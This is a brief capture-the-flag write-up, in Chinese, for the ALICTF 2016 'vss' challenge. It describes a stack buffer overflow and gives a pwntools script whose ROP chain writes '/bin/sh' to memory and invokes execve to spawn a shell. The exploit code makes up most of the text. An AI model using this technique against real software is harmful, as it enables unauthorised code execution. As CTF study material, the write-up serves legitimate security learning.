# ALICTF 2016 - Notes

## vss

一開始需要輸入的開頭必須是 py

然後可以給我們輸入 1024 但實際只有 80 個會複製過去，72 - 80 剛好蓋到 ret

所以要想辦法跳到後面去執行

```
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = process('/tmp/p/a')

bss = 0x6c5db0
trash = 'py' + 'a'*70
pop_rdi = 0x0000000000401823
pop_rsi = 0x0000000000401937
pop_rdx = 0x000000000043ae05
syscall = 0x000000000045f2a5
pop_rax = 0x000000000046f208
add_rsp_0x58 = 0x000000000046f205
mov_drax_rdx = 0x00000000004485ee
payload = flat([pop_rax, bss, pop_rdx, '/bin/sh\x00', mov_drax_rdx])
payload+= flat([pop_rax, 59, pop_rdi, bss, pop_rsi, 0, pop_rdx, 0, syscall])
raw_input("#")
r.sendlineafter(':', trash + p64(add_rsp_0x58) + "a"*8 + payload)

r.interactive()
```